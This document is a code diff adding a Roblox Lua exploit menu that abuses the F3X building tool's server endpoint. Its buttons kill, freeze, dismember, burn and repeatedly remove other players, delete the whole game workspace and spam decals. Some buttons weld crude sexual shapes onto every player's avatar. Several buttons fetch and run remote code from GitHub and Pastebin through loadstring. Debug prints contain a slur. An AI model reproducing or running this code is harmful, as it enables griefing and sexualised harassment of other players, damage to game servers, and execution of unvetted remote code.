+				script.Parent.Parent.Page5.Visible = false
+				script.Parent.Parent.Page6.Visible = false
+				script.Parent.Parent.Page7.Visible = false
+	
+			end)
+	
+		end
+		coroutine.wrap(QPEGI_fake_script)()
+		local function KBIF_fake_script() -- _1.LocalScript 
+			local script = Instance.new('LocalScript', _1)
+	
+			--Script made by sermi, edited by me, karaoke60000! (I added the right click function)
+			--To open GUI, left click. To close, right click!
+			function leftClick(mouse)
+				script.Parent.Parent.Page1.Visible = true --"NAMEHERE is where you put the name of the GUI"
+			end
+			script.Parent.MouseButton1Click:connect(leftClick)
+	
+			function rightClick(mouse)
+				script.Parent.Parent.Page1.Visible = false
+			end
+			script.Parent.MouseButton2Click:connect(rightClick)
+		end
+		coroutine.wrap(KBIF_fake_script)()
+		local function ZCHRME_fake_script() -- re.LocalScript 
+			local script = Instance.new('LocalScript', re)
+	
+			script.Parent.MouseButton1Click:connect(function()
+	
+				function b11()
+					--fatfatfat
+					bv11 = b11
+					spawn(function()
+						while bv11 == true do wait()
+							pcall(function()
+								if game:GetService("Workspace")[game.Players.LocalPlayer.Name] then
+									wait(.0)
+									for i,v in pairs(game:GetService("Workspace")[game.Players.LocalPlayer.Name]:GetDescendants()) do
+										if v.Name == "Config" then
+											a = require(v)
+											a.ReloadTime = 0
+										end
+									end
+								end
+							end)
+						end
+					end)
+				end
+	
+				if game.Players.LocalPlayer.Character.Humanoid.RigType == "R15" then
+					game.Players.LocalPlayer.Character.Humanoid.RigType = "R6" else
+					game.Players.LocalPlayer.Character.Humanoid.RigType = "R15"
+				end
+				game:GetService('StarterGui'):SetCore('ResetButtonCallback',true)
+				game.Players.LocalPlayer.Character:BreakJoints()
+				game.Players.LocalPlayer.Character.Humanoid.Health = 0
+				repeat 
+					if game.Players.LocalPlayer.Character.Humanoid.RigType == "R15" then
+						game.Players.LocalPlayer.Character.Humanoid.RigType = "R6" else
+						game.Players.LocalPlayer.Character.Humanoid.RigType = "R15"
+					end
+	
+				until wait(0.0000001)
+	
+				if game.Players.LocalPlayer.Character.Humanoid.RigType == "R15" then
+					game.Players.LocalPlayer.Character.Humanoid.RigType = "R6" else
+					game.Players.LocalPlayer.Character.Humanoid.RigType = "R15"
+				end
+				Character = game:GetService("Players").LocalPlayer.Character
+	
+				respawn = nil
+				Character.Head.Died:Remove()
+	
+				Character:FindFirstChild("Humanoid").BreakJointsOnDeath = false
+				Character:FindFirstChild("Humanoid").Health = respawn
+				game.Players.LocalPlayer.Character:Destroy()
+				local players = game:GetService("Players");
+	
+	
+				for _,v in ipairs(players:GetPlayers()) do
+					spawn(function()
+						v.CharacterAdded:Connect(function(char)
+							repeat wait() until char:FindFirstChildOfClass("Humanoid");
+							char:FindFirstChildOfClass("Humanoid").Died:Connect(function()
+								v:LoadCharacter();
+	
+	
+	
+							end);
+						end);
+					end)
+				end
+				game.Players.LocalPlayer.Character:Destroy()
+	
+				game.Players.CharacterAutoLoads = true
+				game.Players:LoadCharacter()
+				game.Players.LocalPlayer.Character:Destroy()
+				if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Cam") then
+					game:GetService("ReplicatedStorage").Events.LoadCharacter:FireServer()
+				end 
+				game:GetService("ReplicatedStorage").Events.LoadCharacter:FireServer()
+	
+			end)
+		end
+		coroutine.wrap(ZCHRME_fake_script)()
+	end)
+end
+coroutine.wrap(HWMLMUE_fake_script)()
+local function CTNSBQ_fake_script() -- Harked.LocalScript 
+	local script = Instance.new('LocalScript', Harked)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local message = Instance.new("Message")
+		message.Parent = game.Workspace
+		message.Text = "btools's name can be edited in settings if different than the regular name"
+		wait(3)
+		message:Destroy()
+	
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	
+		local btools = script.Parent.Parent.Parent.Parent.Settings.Page1["Btools Name"].Btools.Text
+	
+		local function get_f3x()
+			local lp = game:GetService('Players').LocalPlayer
+			if lp.Character:FindFirstChild(btools) then
+				return lp.Character:FindFirstChild(btools)
+			elseif lp.Backpack:FindFirstChild(btools) then
+				return lp.Backpack:FindFirstChild(btools)
+			end
+			return nil
+		end
+	
+		local function make_request(args)
+			local f3x = get_f3x()
+			if f3x == nil then
+				notify('Couldnt find F3X tool')
+				return
+			end
+	
+			f3x.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))  
+		end
+	
+		local click_del = nil
+		local unanchor = nil
+		local loopkill = {}
+	
+		local function on_childadded(child)
+			task.wait()
+			if game:GetService('Players'):GetPlayerFromCharacter(child) ~= nil and table.find(loopkill, child.Name) then
+				local head = child:WaitForChild('Head')
+				make_request({
+					[1] = 'Remove';
+					[2] = {
+						head;
+					};
+				})
+			end
+		end
+	
+		game:GetService('Workspace').ChildAdded:Connect(on_childadded)
+	
+		local main = Instance.new("ScreenGui")
+		local top = Instance.new("Frame")
+		local back = Instance.new("Frame")
+		local kill = Instance.new("TextButton")
+		local thaw = Instance.new("TextButton")
+		local top_2 = Instance.new("TextLabel")
+		local unthaw = Instance.new("TextButton")
+		local credits = Instance.new("TextLabel")
+		local nolimbs = Instance.new("TextButton")
+		local sink = Instance.new("TextButton")
+		local nuke = Instance.new("TextButton")
+		local kick = Instance.new("TextButton")
+		local target = Instance.new("TextBox")
+		local queue = Instance.new("TextButton")
+		local burn = Instance.new("TextButton")
+	
+		--Properties:
+		main.Name = "main"
+		main.Parent = game:GetService("CoreGui")
+	
+		top.Name = "top"
+		top.Parent = main
+		top.Draggable = true
+		top.Active = true
+		top.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
+		top.BackgroundTransparency = 0.30000001192093
+		top.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+		top.Position = UDim2.new(0.612145662, 0, 0.311965823, 0)
+		top.Size = UDim2.new(0, 291, 0, 30)
+	
+		back.Name = "back"
+		back.Parent = top
+		back.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
+		back.BackgroundTransparency = 0.30000001192093
+		back.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+		back.BorderSizePixel = 0
+		back.Position = UDim2.new(-0.00343642617, 0, 1, 0)
+		back.Size = UDim2.new(0, 293, 0, 293)
+	
+		kill.Name = "kill"
+		kill.Parent = top
+		kill.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		kill.BackgroundTransparency = 0.5
+		kill.BorderSizePixel = 0
+		kill.Position = UDim2.new(0.0206185561, 0, 1.76666665, 0)
+		kill.Size = UDim2.new(0, 134, 0, 40)
+		kill.Font = Enum.Font.SourceSansLight
+		kill.Text = "Kill"
+		kill.TextColor3 = Color3.new(1, 1, 1)
+		kill.TextSize = 23
+	
+		thaw.Name = "thaw"
+		thaw.Parent = top
+		thaw.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		thaw.BackgroundTransparency = 0.5
+		thaw.BorderSizePixel = 0
+		thaw.Position = UDim2.new(0.525773168, 0, 1.76666665, 0)
+		thaw.Size = UDim2.new(0, 131, 0, 40)
+		thaw.Font = Enum.Font.SourceSansLight
+		thaw.Text = "Thaw"
+		thaw.TextColor3 = Color3.new(1, 1, 1)
+		thaw.TextSize = 23
+	
+		top_2.Name = "top"
+		top_2.Parent = top
+		top_2.BackgroundColor3 = Color3.new(1, 1, 1)
+		top_2.BackgroundTransparency = 1
+		top_2.Position = UDim2.new(0.154639184, 0, -0.333333343, 0)
+		top_2.Size = UDim2.new(0, 200, 0, 50)
+		top_2.Font = Enum.Font.SourceSansLight
+		top_2.Text = "Harked"
+		top_2.TextColor3 = Color3.new(1, 1, 1)
+		top_2.TextSize = 45
+	
+		unthaw.Name = "unthaw"
+		unthaw.Parent = top
+		unthaw.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		unthaw.BackgroundTransparency = 0.5
+		unthaw.BorderSizePixel = 0
+		unthaw.Position = UDim2.new(0.0206185561, 0, 3.56217241, 0)
+		unthaw.Size = UDim2.new(0, 134, 0, 40)
+		unthaw.Font = Enum.Font.SourceSansLight
+		unthaw.Text = "Unthaw"
+		unthaw.TextColor3 = Color3.new(1, 1, 1)
+		unthaw.TextSize = 23
+	
+		credits.Name = "credits"
+		credits.Parent = top
+		credits.BackgroundColor3 = Color3.new(1, 1, 1)
+		credits.BackgroundTransparency = 1
+		credits.Position = UDim2.new(0, 0, 1, 0)
+		credits.Size = UDim2.new(0, 291, 0, 23)
+		credits.Font = Enum.Font.SourceSansLight
+		credits.Text = "only works if you have btools"
+		credits.TextColor3 = Color3.new(1, 1, 1)
+		credits.TextSize = 17
+		credits.TextWrapped = true
+	
+		nolimbs.Name = "nolimbs"
+		nolimbs.Parent = top
+		nolimbs.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		nolimbs.BackgroundTransparency = 0.5
+		nolimbs.BorderSizePixel = 0
+		nolimbs.Position = UDim2.new(0.0206185561, 0, 5.39550591, 0)
+		nolimbs.Size = UDim2.new(0, 134, 0, 40)
+		nolimbs.Font = Enum.Font.SourceSansLight
+		nolimbs.Text = "NoLimbs"
+		nolimbs.TextColor3 = Color3.new(1, 1, 1)
+		nolimbs.TextSize = 23
+	
+		sink.Name = "sink"
+		sink.Parent = top
+		sink.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		sink.BackgroundTransparency = 0.5
+		sink.BorderSizePixel = 0
+		sink.Position = UDim2.new(0.525773168, 0, 5.39550591, 0)
+		sink.Size = UDim2.new(0, 131, 0, 40)
+		sink.Font = Enum.Font.SourceSansLight
+		sink.Text = "Sink"
+		sink.TextColor3 = Color3.new(1, 1, 1)
+		sink.TextSize = 23
+	
+		nuke.Name = "nuke"
+		nuke.Parent = top
+		nuke.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		nuke.BackgroundTransparency = 0.5
+		nuke.BorderSizePixel = 0
+		nuke.Position = UDim2.new(0.525773168, 0, 7.1955061, 0)
+		nuke.Size = UDim2.new(0, 131, 0, 40)
+		nuke.Font = Enum.Font.SourceSansLight
+		nuke.Text = "Nuke"
+		nuke.TextColor3 = Color3.new(1, 1, 1)
+		nuke.TextSize = 23
+	
+		kick.Name = "kick"
+		kick.Parent = top
+		kick.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		kick.BackgroundTransparency = 0.5
+		kick.BorderSizePixel = 0
+		kick.Position = UDim2.new(0.0206185561, 0, 7.1955061, 0)
+		kick.Size = UDim2.new(0, 134, 0, 40)
+		kick.Font = Enum.Font.SourceSansLight
+		kick.Text = "Kick"
+		kick.TextColor3 = Color3.new(1, 1, 1)
+		kick.TextSize = 23
+	
+		target.Name = "target"
+		target.Parent = top
+		target.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		target.BackgroundTransparency = 0.40000000596046
+		target.Position = UDim2.new(0.0206185561, 0, 8.86666584, 0)
+		target.Size = UDim2.new(0, 278, 0, 33)
+		target.Font = Enum.Font.SourceSans
+		target.Text = ""
+		target.TextColor3 = Color3.new(1, 1, 1)
+		target.TextSize = 23
+	
+		queue.Name = "queue"
+		queue.Parent = top
+		queue.BackgroundColor3 = Color3.new(1, 1, 1)
+		queue.BackgroundTransparency = 1
+		queue.Position = UDim2.new(0.15463917, 0, 10.0333328, 0)
+		queue.Size = UDim2.new(0, 201, 0, 23)
+		queue.Font = Enum.Font.SourceSans
+		queue.Text = "Ban"
+		queue.TextColor3 = Color3.new(1, 0, 0.0156863)
+		queue.TextSize = 20
+		queue.TextWrapped = true
+	
+		burn.Name = "burn"
+		burn.Parent = top
+		burn.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
+		burn.BackgroundTransparency = 0.5
+		burn.BorderSizePixel = 0
+		burn.Position = UDim2.new(0.525773168, 0, 3.56217265, 0)
+		burn.Size = UDim2.new(0, 131, 0, 40)
+		burn.Font = Enum.Font.SourceSansLight
+		burn.Text = "Burn"
+		burn.TextColor3 = Color3.new(1, 1, 1)
+		burn.TextSize = 23
+	
+		-- RUSELLO25'S WORK --
+	
+		kill.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local char = player.Character
+					if char and char:FindFirstChild('Head') then
+						local head = char.Head
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head;
+							};
+						})
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local char = game:GetService('Players')[player].Character
+					if char and char:FindFirstChild('Head') then
+						local head = char.Head
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head;
+							};
+						}) else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	
+		thaw.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local char = player.Character
+					if char and char:FindFirstChild('HumanoidRootPart') then
+						local hrp = char.HumanoidRootPart
+						make_request({
+							[1] = "SyncAnchor",
+							[2] = {
+								[1] = {
+									["Part"] = hrp,
+									["Anchored"] = true
+								}
+							}
+						})
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local char = game:GetService('Players')[player].Character
+					if char and char:FindFirstChild('HumanoidRootPart') then
+						local hrp = char.HumanoidRootPart
+						make_request({
+							[1] = "SyncAnchor",
+							[2] = {
+								[1] = {
+									["Part"] = hrp,
+									["Anchored"] = true
+								}
+							}
+						}) else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	
+		unthaw.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local char = player.Character
+					if char and char:FindFirstChild('HumanoidRootPart') then
+						local hrp = char.HumanoidRootPart
+						make_request({
+							[1] = "SyncAnchor",
+							[2] = {
+								[1] = {
+									["Part"] = hrp,
+									["Anchored"] = false
+								}
+							}
+						})
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local char = game:GetService('Players')[player].Character
+					if char and char:FindFirstChild('HumanoidRootPart') then
+						local hrp = char.HumanoidRootPart
+						make_request({
+							[1] = "SyncAnchor",
+							[2] = {
+								[1] = {
+									["Part"] = hrp,
+									["Anchored"] = false
+								}
+							}
+						}) else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	
+		burn.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local char = player.Character
+					if char then
+						for _, part in pairs(char:GetDescendants()) do
+							if part:IsA('BasePart') then
+								make_request({
+									[1] = "CreateDecorations",
+									[2] = {
+										[1] = {
+											["Part"] = part,
+											["DecorationType"] = "Fire"
+										}
+									}
+								})
+								make_request({
+									[1] = "SyncColor",
+									[2] = {
+										[1] = {
+											["Part"] = part,
+											["Color"] = Color3.fromRGB(0, 0, 0),
+											["UnionColoring"] = true
+										}
+									}
+								})
+								task.spawn(function()
+									if part.Name ~= 'Head' and part.Name ~= 'LowerTorso' and part.Name ~= 'UpperTorso' and part.Name ~= 'Torso' then
+										task.wait(math.random(20, 70)/10)
+										make_request({
+											[1] = 'Remove';
+											[2] = {
+												part;
+											};
+										})
+									end
+								end)
+							end
+						end
+					end
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local char = game:GetService('Players')[player].Character
+					if char then
+						for _, part in pairs(char:GetDescendants()) do
+							if part:IsA('BasePart') then
+								make_request({
+									[1] = "CreateDecorations",
+									[2] = {
+										[1] = {
+											["Part"] = part,
+											["DecorationType"] = "Fire"
+										}
+									}
+								})
+								make_request({
+									[1] = "SyncColor",
+									[2] = {
+										[1] = {
+											["Part"] = part,
+											["Color"] = Color3.fromRGB(0, 0, 0),
+											["UnionColoring"] = true
+										}
+									}
+								})
+								task.spawn(function()
+									if part.Name ~= 'Head' and part.Name ~= 'LowerTorso' and part.Name ~= 'UpperTorso' and part.Name ~= 'Torso' then
+										task.wait(math.random(20, 70)/10)
+										make_request({
+											[1] = 'Remove';
+											[2] = {
+												part;
+											};
+										}) else
+										print("nibba who this")
+									end
+								end)
+							end
+						end
+					end
+				end
+			end
+		end)
+	
+		nolimbs.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local char = player.Character
+					if char and char:FindFirstChild('Right Arm') then
+						local head = char["Right Arm"]
+						local head2 = char["Left Arm"]
+						local head3 = char["Right Leg"]
+						local head4 = char["Left Leg"]
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head, head2, head3, head4;
+							};
+						})
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local char = game:GetService('Players')[player].Character
+					if char and char:FindFirstChild('Right Arm') then
+						local head = char["Right Arm"]
+						local head2 = char["Left Arm"]
+						local head3 = char["Right Leg"]
+						local head4 = char["Left Leg"]
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head, head2, head3, head4;
+							};
+						}) else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	
+		sink.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local char = player.Character
+					if char and char:FindFirstChild('HumanoidRootPart') then
+						local head = char.HumanoidRootPart
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head;
+							};
+						})
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local char = game:GetService('Players')[player].Character
+					if char and char:FindFirstChild('HumanoidRootPart') then
+						local head = char.HumanoidRootPart
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head;
+							};
+						}) else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	
+		kick.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local instanceofplayer = player.Character
+					if instanceofplayer and instanceofplayer:FindFirstChild('Humanoid') then
+						local head = instanceofplayer
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head;
+							};
+						})
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local instanceofplayer = game:GetService('Players')[player].Character
+					if instanceofplayer and instanceofplayer:FindFirstChild('Humanoid') then
+						local head = instanceofplayer
+						make_request({
+							[1] = 'Remove';
+							[2] = {
+								head;
+							};
+						}) else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	
+		nuke.MouseButton1Down:connect(function()
+			for i,c in pairs(game.Workspace:GetChildren()) do
+				local ohok = c
+				make_request({
+					[1] = 'Remove';
+					[2] = {
+						ohok;
+					};
+				})
+			end
+		end)
+	
+		queue.MouseButton1Down:connect(function()
+			if string.lower(target.Text) == "all" then
+				for i,c in pairs(game.Players:GetPlayers()) do
+					local player = game.Players:GetPlayers()
+					local instanceofplayer = player.Character
+					if instanceofplayer and instanceofplayer:FindFirstChild('Humanoid') then
+						local head = instanceofplayer
+						while true do
+							make_request({
+								[1] = 'Remove';
+								[2] = {
+									head;
+								};
+							})
+						end
+					end
+	
+				end
+			else
+				if game.Players:FindFirstChild(target.Text) then
+					local player = target.Text
+					local instanceofplayer = game:GetService('Players')[player].Character
+					if instanceofplayer and instanceofplayer:FindFirstChild('Humanoid') then
+						local head = instanceofplayer
+						while true do
+							make_request({
+								[1] = 'Remove';
+								[2] = {
+									head;
+								};
+							}) 
+						end
+					else
+						print("nibba who this")
+					end
+	
+				end
+	
+			end
+		end)
+	end)
+end
+coroutine.wrap(CTNSBQ_fake_script)()
+local function LQESCG_fake_script() -- RK1.LocalScript 
+	local script = Instance.new('LocalScript', RK1)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/rusello25/scripts/main/RK1"))()
+	end)
+end
+coroutine.wrap(LQESCG_fake_script)()
+local function WDPR_fake_script() -- HarkinianGui.LocalScript 
+	local script = Instance.new('LocalScript', HarkinianGui)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/rusello25/scripts/main/HG"))()
+	end)
+end
+coroutine.wrap(WDPR_fake_script)()
+local function VIKVN_fake_script() -- UnanchorAll.LocalScript 
+	local script = Instance.new('LocalScript', UnanchorAll)
+
+	local btools = script.Parent.Parent.Parent.Parent.Settings.Page1["Btools Name"].Btools.Text
+	
+	local function get_f3x()
+		local lp = game:GetService('Players').LocalPlayer
+		if lp.Character:FindFirstChild(btools) then
+			return lp.Character:FindFirstChild(btools)
+		elseif lp.Backpack:FindFirstChild(btools) then
+			return lp.Backpack:FindFirstChild(btools)
+		end
+		return nil
+	end
+	
+	local function make_request(args)
+		local f3x = get_f3x()
+		if f3x == nil then
+			notify('Couldnt find F3X tool')
+			return
+		end
+	
+		f3x.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))  
+	end
+	
+	local click_del = nil
+	local unanchor = nil
+	local loopkill = {}
+	
+	local function on_childadded(child)
+		task.wait()
+		if game:GetService('Players'):GetPlayerFromCharacter(child) ~= nil and table.find(loopkill, child.Name) then
+			local head = child:WaitForChild('Head')
+			make_request({
+				[1] = 'Remove';
+				[2] = {
+					head;
+				};
+			})
+		end
+	end
+	
+	game:GetService('Workspace').ChildAdded:Connect(on_childadded)
+	
+	script.Parent.MouseButton1Click:connect(function()
+		for i,c in pairs(game.Workspace:GetChildren()) do
+			local ohok = c
+			make_request({
+				[1] = 'SyncUnanchor';
+				[2] = {
+					ohok;
+				};
+			})
+		end
+	end)
+end
+coroutine.wrap(VIKVN_fake_script)()
+local function QWBLRAK_fake_script() -- DecalSpam.LocalScript 
+	local script = Instance.new('LocalScript', DecalSpam)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local F3X = loadstring(game:HttpGet("https://raw.githubusercontent.com/rusello25/scripts/main/F3X%20Module"))()
+	
+		local DECALID = script.Parent.Parent.Parent.Parent.Settings.Page1["Decal ID"].TextBox.Text -- Insert decal ID here
+	
+		local function GetClasses(Object, Class)
+			local Objects = {}
+			for _, Child in pairs(Object:GetChildren()) do
+				pcall(function()
+					if Child:IsA(Class) then
+						table.insert(Objects, Child)
+					end
+				end)
+				pcall(function()
+					for _, Obj in pairs(GetClasses(Child, Class)) do
+						table.insert(Objects, Obj)
+					end
+				end)
+			end
+			return Objects
+		end
+	
+		local function Spam(ID)
+			local Surfaces = {"Front", "Back", "Left", "Right", "Top", "Bottom"}
+			for _, Part in pairs(GetClasses(game, "BasePart")) do
+				for _, Surface in pairs(Surfaces) do
+					local F3X = Instance.new("Decal", Part)
+					F3X.Face = Surface
+					F3X.Texture = "rbxassetid://" .. (ID-1)
+				end
+			end
+		end
+	
+		Spam(DECALID)
+	end)
+end
+coroutine.wrap(QWBLRAK_fake_script)()
+local function MVNQPU_fake_script() -- Vector13.LocalScript 
+	local script = Instance.new('LocalScript', Vector13)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		-- thanks to the guy who made this gui 
+	
+		local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+		local Window = Library.CreateLib("Vector13 (Beta)", "Sentinel")
+		local Tab = Window:NewTab("Destroy")
+		local Section1 = Tab:NewSection("Destroy")
+		Section1:NewButton("Penis All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part.Material = ("Smooth Plastic")
+					part.Size = Vector3.new(0.8, 0.8, 3)
+					part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -2)
+					wait()
+					part:WeldTo(player.Character.HumanoidRootPart)
+	
+					local part2 = F3X.new("Ball", workspace)
+					part2.CanCollide = false
+					part2.BrickColor = BrickColor.new(3)
+					part2.Material = ("Smooth Plastic")
+					part2.Size = Vector3.new(1, 1, 4)
+					part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, -0.5, -1)
+					wait()
+					part2:WeldTo(player.Character.HumanoidRootPart)
+	
+					local part3 = F3X.new("Ball", workspace)
+					part3.CanCollide = false
+					part3.Material = ("Smooth Plastic")
+					part3.BrickColor = BrickColor.new(22)
+					part3.Size = Vector3.new(1, 1, 3)
+					part3.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -3.5)
+					wait()
+					part3:WeldTo(player.Character.HumanoidRootPart)
+					local part1 = F3X.new("Ball", workspace)
+					part1.CanCollide = false
+					part1.BrickColor = BrickColor.new(3)
+					part1.Material = ("Smooth Plastic")
+					part1.Size = Vector3.new(1, 1, 4)
+					part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, -0.5, -1)
+					wait()
+	
+					part1:WeldTo(player.Character.HumanoidRootPart)
+	
+				end)
+	
+			end
+	
+	
+		end)
+		Section1:NewButton("Block Penis All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part.Material = ("Smooth Plastic")
+					part.Size = Vector3.new(0.8, 0.8, 3)
+					part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -2)
+					wait()
+					part:WeldTo(player.Character.HumanoidRootPart)
+	
+					local part2 = F3X.new("Part", workspace)
+					part2.CanCollide = false
+					part2.BrickColor = BrickColor.new(3)
+					part2.Material = ("Smooth Plastic")
+					part2.Size = Vector3.new(1, 1, 4)
+					part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, -0.5, -1)
+					wait()
+					part2:WeldTo(player.Character.HumanoidRootPart)
+	
+					local part3 = F3X.new("Part", workspace)
+					part3.CanCollide = false
+					part3.Material = ("Smooth Plastic")
+					part3.BrickColor = BrickColor.new(22)
+					part3.Size = Vector3.new(1, 1, 3)
+					part3.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -3.5)
+					wait()
+					part3:WeldTo(player.Character.HumanoidRootPart)
+					local part1 = F3X.new("Part", workspace)
+					part1.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part1.Material = ("Smooth Plastic")
+					part1.Size = Vector3.new(1, 1, 4)
+					part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, -0.5, -1)
+					wait()
+	
+					part1:WeldTo(player.Character.HumanoidRootPart)
+	
+				end)
+	
+			end
+		end)
+		Section1:NewButton("Butt All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+	
+					local part2 = F3X.new("Ball", workspace)
+					part2.CanCollide = false
+					part2.BrickColor = BrickColor.new(3)
+					part2.Material = ("Smooth Plastic")
+					part2.Size = Vector3.new(2, 2, 2)
+					part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, -0.5, 0.8)
+					wait()
+					part2:WeldTo(player.Character.HumanoidRootPart)
+	
+	
+					local part1 = F3X.new("Ball", workspace)
+					part1.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part1.Material = ("Smooth Plastic")
+					part1.Size = Vector3.new(2, 2, 2)
+					part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, -0.5, 0.8)
+					wait()
+	
+					part1:WeldTo(player.Character.HumanoidRootPart)
+	
+				end)
+	
+			end
+	
+	
+		end)
+		Section1:NewButton("Tits All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+	
+					local part2 = F3X.new("Ball", workspace)
+					part2.CanCollide = false
+					part2.BrickColor = BrickColor.new(3)
+					part2.Material = ("Smooth Plastic")
+					part2.Size = Vector3.new(2, 2, 2)
+					part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, 0.5, -1)
+					wait()
+					part2:WeldTo(player.Character.HumanoidRootPart)
+	
+	
+					local part1 = F3X.new("Ball", workspace)
+					part1.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part1.Material = ("Smooth Plastic")
+					part1.Size = Vector3.new(2, 2, 2)
+					part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, 0.5, -1)
+					wait()
+	
+					part1:WeldTo(player.Character.HumanoidRootPart)
+					local part2 = F3X.new("Ball", workspace)
+					part2.CanCollide = false
+					part2.BrickColor = BrickColor.new(9)
+					part2.Material = ("Smooth Plastic")
+					part2.Size = Vector3.new(1, 1, 1)
+					part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, 0.5, -1.8)
+					wait()
+					part2:WeldTo(player.Character.HumanoidRootPart)
+	
+	
+					local part1 = F3X.new("Ball", workspace)
+					part1.CanCollide = false
